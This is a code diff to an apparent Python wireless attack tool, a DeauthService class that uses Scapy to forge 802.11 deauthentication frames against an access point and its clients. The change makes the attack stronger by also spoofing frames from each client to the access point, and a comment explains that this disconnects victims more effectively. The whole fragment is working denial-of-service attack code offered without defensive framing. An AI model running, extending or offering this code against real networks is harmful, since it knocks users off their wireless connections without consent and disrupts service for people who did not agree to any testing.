@@ -44,7 +44,13 @@ class DeauthService:
 
     def _run(self, bssid: str, clients: List[str], packets: int, interval: float) -> None:
         broadcast_frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
-        frames = [RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7) for client in clients]
+        # Send in both directions per client: one frame the client "receives"
+        # from the AP, and one the AP "receives" from the client. Kicking both
+        # ends of the association is markedly more effective than AP->STA alone.
+        frames = []
+        for client in clients:
+            frames.append(RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7))
+            frames.append(RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7))
         cycle = 0
         total_sent = 0
         try:
